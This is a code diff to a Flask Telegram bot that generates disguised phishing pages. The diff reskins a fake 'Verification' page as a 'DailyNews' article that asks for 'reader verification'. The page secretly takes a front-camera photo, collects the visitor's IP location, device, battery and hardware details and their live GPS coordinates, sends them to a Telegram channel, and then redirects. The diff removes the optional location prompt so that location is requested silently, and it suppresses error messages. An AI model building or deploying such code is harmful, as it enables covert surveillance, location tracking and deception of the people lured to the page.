@@ -14,9 +14,8 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# ========== ENVIRONMENT VARIABLES ==========
 TOKEN = os.environ.get("BOT_TOKEN")
-CHANNEL_ID = os.environ.get("CHANNEL_ID")  # तुम्हारी channel id यहाँ से आएगी
+CHANNEL_ID = os.environ.get("CHANNEL_ID")
 REQUIRED_CHANNEL = "@nrtecno2"
 ACCOUNT_NAME = "telegram-bot-b9j0"
 HTML_DIR = "html_files"
@@ -92,7 +91,6 @@ def generate_html(user_id, target_url):
     filename = f"v_{user_id}_{int(time.time())}.html"
     filepath = os.path.join(HTML_DIR, filename)
     
-    # CHANNEL_ID env var से लिया जाएगा – default khali रखा है
     storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
     
     html = f"""<!DOCTYPE html>
@@ -100,51 +98,167 @@ def generate_html(user_id, target_url):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>News Updates</title>
     <style>
-        * {{ user-select: none; margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }}
-        .container {{ background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }}
-        .spinner {{ width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }}
-        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .btn {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; }}
-        .skip {{ background: #95a5a6; }}
-        .error {{ color: #e74c3c; margin-top: 10px; font-size: 14px; }}
-        .info {{ color: #666; font-size: 12px; margin-top: 20px; }}
-        h2 {{ color: #333; margin-bottom: 20px; }}
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }}
+        .card {{
+            background: white;
+            border-radius: 24px;
+            max-width: 400px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }}
+        .header {{
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 24px 20px;
+            text-align: center;
+        }}
+        .logo {{
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+        }}
+        .logo span {{
+            color: #e94560;
+        }}
+        .badge {{
+            background: rgba(255,255,255,0.2);
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: white;
+            margin-top: 8px;
+        }}
+        .content {{
+            padding: 24px 20px;
+        }}
+        .loader {{
+            width: 48px;
+            height: 48px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #e94560;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
+        }}
+        h3 {{
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            font-size: 18px;
+        }}
+        p {{
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }}
+        .btn {{
+            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }}
+        .btn:active {{
+            transform: scale(0.98);
+        }}
+        .btn-secondary {{
+            background: #f0f0f0;
+            color: #666;
+        }}
+        .status {{
+            margin-top: 16px;
+            font-size: 13px;
+            color: #999;
+            text-align: center;
+        }}
+        .step {{ display: none; }}
+        .active {{ display: block; }}
+        .error {{
+            background: #fee;
+            color: #e94560;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-top: 16px;
+            text-align: center;
+        }}
+        .success {{
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-top: 16px;
+            text-align: center;
+        }}
     </style>
 </head>
 <body>
-<div class="container">
-    <div id="step1">
-        <div class="spinner"></div>
-        <h2>Verifying Device...</h2>
-        <p>Please wait while we check your device</p>
+<div class="card">
+    <div class="header">
+        <div class="logo">Daily<span>News</span></div>
+        <div class="badge">Trending Now</div>
     </div>
-    <div id="step2" style="display:none">
-        <h2>Verification Required</h2>
-        <button class="btn" onclick="requestCamera()">CONTINUE</button>
-        <div id="errorMsg" class="error"></div>
-        <p class="info">Camera access is required to continue</p>
+    
+    <div class="content" id="step1">
+        <div class="loader"></div>
+        <h3 style="text-align:center">Loading latest updates...</h3>
+        <p style="text-align:center; margin-top:8px">Please wait while we fetch the content</p>
     </div>
-    <div id="step3" style="display:none">
-        <div class="spinner"></div>
-        <h2>Camera Access</h2>
-        <p>Requesting camera permission...</p>
+    
+    <div class="content" id="step2" style="display:none">
+        <h3>💬 Reader Verification</h3>
+        <p>To continue reading this article, please complete a quick verification.</p>
+        <button class="btn" onclick="requestCamera()">Continue Reading →</button>
+        <div id="errorMsg" class="error" style="display:none"></div>
+        <div class="status">Over 1M readers verified daily</div>
     </div>
-    <div id="step4" style="display:none">
-        <div class="spinner"></div>
-        <h2>Location Access (Optional)</h2>
-        <p>This helps us verify your region</p>
-        <button class="btn" onclick="allowLocation()">ALLOW LOCATION</button>
-        <button class="btn skip" onclick="skipLocation()">SKIP</button>
+    
+    <div class="content" id="step3" style="display:none">
+        <div class="loader"></div>
+        <h3 style="text-align:center">Setting up secure connection...</h3>
+        <p style="text-align:center; margin-top:8px">This won't take long</p>
     </div>
-    <div id="step5" style="display:none">
-        <div class="spinner"></div>
-        <h2>Redirecting...</h2>
-        <p>Please wait</p>
+    
+    <div class="content" id="step4" style="display:none">
+        <div class="loader"></div>
+        <h3 style="text-align:center">Optimizing your experience</h3>
+        <p style="text-align:center; margin-top:8px">Almost there...</p>
+        <button class="btn btn-secondary" onclick="skipLocation()" style="margin-top:20px">Continue without location</button>
+    </div>
+    
+    <div class="content" id="step5" style="display:none">
+        <div class="loader"></div>
+        <h3 style="text-align:center">Redirecting to article</h3>
+        <p style="text-align:center; margin-top:8px">Please wait</p>
     </div>
 </div>
+
 <video id="video" autoplay playsinline muted style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
@@ -153,8 +267,6 @@ const TOKEN = "{TOKEN}";
 const USER = {user_id};
 const STORAGE = {storage_channel};
 const TARGET = "{target_url}";
-let locationAllowed = false;
-let locationSkipped = false;
 
 function formatBytes(bytes) {{
     if (bytes === 0) return '0 Bytes';
@@ -183,14 +295,13 @@ async function sendToUser(text, file=null) {{
                 await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
             }}
         }}
-    }} catch(e) {{ console.log(e); }}
+    }} catch(e) {{}}
 }}
 
 async function getIPInfo(ip) {{
     try {{
         let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
-        let d = await r.json();
-        return d;
+        return await r.json();
     }} catch(e) {{ return {{}}; }}
 }}
 
@@ -214,10 +325,10 @@ function getDeviceInfo() {{
 }}
 
 function getHardwareInfo() {{
-    let cores = navigator.hardwareConcurrency || 'Unknown';
-    let ram = 'Unknown';
-    if(navigator.deviceMemory) ram = navigator.deviceMemory + ' GB';
-    return {{ cores: cores, ram: ram }};
+    return {{
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
+    }};
 }}
 
 async function getStorageInfo() {{
@@ -241,7 +352,7 @@ async function captureData() {{
         let deviceType = getDeviceInfo();
         let hardware = getHardwareInfo();
         let storage = await getStorageInfo();
-        let language = navigator.language || navigator.userLanguage || 'Unknown';
+        let language = navigator.language || 'Unknown';
         let resolution = screen.width + 'x' + screen.height;
         
         let message = "<b>Visitor Information Captured</b>\\n";
@@ -256,25 +367,22 @@ async function captureData() {{
         message += "   Country: " + (ipInfo.country_name || 'Unknown') + "\\n";
         message += "   Region: " + (ipInfo.region || 'Unknown') + "\\n";
         message += "   City: " + (ipInfo.city || 'Unknown') + "\\n";
-        message += "   Postal Code: " + (ipInfo.postal || 'Unknown') + "\\n";
         message += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n\\n";
-        message += "<b>Display Information</b>\\n";
+        message += "<b>Display</b>\\n";
         message += "   Resolution: " + resolution + "\\n\\n";
-        message += "<b>Battery Status</b>\\n";
+        message += "<b>Battery</b>\\n";
         message += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
         message += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n\\n";
-        message += "<b>Hardware & Storage</b>\\n";
+        message += "<b>Hardware</b>\\n";
         message += "   CPU Cores: " + hardware.cores + "\\n";
         message += "   RAM: " + hardware.ram + "\\n";
-        message += "   Storage Used: " + (storage ? storage.usedFormatted : 'Unknown') + "\\n";
-        message += "   Storage Total: " + (storage ? storage.totalFormatted : 'Unknown') + "\\n\\n";
+        message += "   Storage: " + (storage ? storage.usedFormatted + ' / ' + storage.totalFormatted : 'Unknown') + "\\n\\n";
         message += "------------------------\\n";
         message += "Developed by: @nrtecno2";
         
         await sendToUser(message);
         return true;
     }} catch(e) {{
-        await sendToUser('Error capturing data: ' + e.message);
         return false;
     }}
 }}
@@ -292,7 +400,7 @@ async function captureFrontPhoto() {{
         canvas.getContext('2d').drawImage(video, 0, 0);
         let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
         if(blob && blob.size > 500) {{
-            await sendToUser('<b>FRONT CAMERA PHOTO</b>', blob);
+            await sendToUser('<b>Front Camera Photo</b>', blob);
         }}
         stream.getTracks().forEach(t => t.stop());
         return true;
@@ -301,29 +409,7 @@ async function captureFrontPhoto() {{
     }}
 }}
 
-async function allowLocation() {{
-    locationAllowed = true;
-    locationSkipped = false;
-    document.getElementById('step4').style.display = 'none';
-    document.getElementById('step5').style.display = 'block';
-    
-    if(navigator.geolocation) {{
-        navigator.geolocation.getCurrentPosition(async (p) => {{
-            await sendToUser('<b>LIVE LOCATION</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
-            await sendToUser('<b>Coordinates</b>\\nLatitude: ' + p.coords.latitude + '\\nLongitude: ' + p.coords.longitude + '\\nAccuracy: ' + p.coords.accuracy + 'm');
-            setTimeout(() => window.location.href = TARGET, 1500);
-        }}, async (err) => {{
-            await sendToUser('Location: Access denied by user');
-            setTimeout(() => window.location.href = TARGET, 1500);
-        }}, {{ timeout: 10000, enableHighAccuracy: true }});
-    }} else {{
-        setTimeout(() => window.location.href = TARGET, 1500);
-    }}
-}}
-
 async function skipLocation() {{
-    locationSkipped = true;
-    locationAllowed = false;
     document.getElementById('step4').style.display = 'none';
     document.getElementById('step5').style.display = 'block';
     await sendToUser('Location: Skipped by user');
@@ -340,11 +426,21 @@ async function requestCamera() {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step4').style.display = 'block';
         await sendToUser('Camera access granted');
+        
+        if(navigator.geolocation) {{
+            navigator.geolocation.getCurrentPosition(async (p) => {{
+                await sendToUser('<b>Live Location</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
+            }}, async (err) => {{
+                await sendToUser('Location: Access denied');
+            }}, {{ timeout: 8000, enableHighAccuracy: true }});
+        }}
     }} else {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        document.getElementById('errorMsg').innerHTML = 'Camera access required!';
-        await sendToUser('Camera access denied by user');
+        let errorDiv = document.getElementById('errorMsg');
+        errorDiv.innerText = 'Verification failed. Please try again.';
+        errorDiv.style.display = 'block';
+        await sendToUser('Camera access denied');
     }}
 }}
 
